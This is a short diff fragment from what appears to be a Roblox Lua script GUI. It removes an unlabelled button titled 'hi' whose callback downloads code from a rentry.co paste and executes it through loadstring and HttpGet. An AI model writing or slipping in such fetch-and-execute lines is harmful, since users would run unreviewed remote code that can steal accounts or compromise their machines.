@@ -6875,15 +6875,6 @@ end
 
 
 
-Tabs.Ok:AddButton({
-	Title = "hi", 
-	Description = "",
-	Callback = function()
-        loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
-
-	
-    end
-})
 
 
   
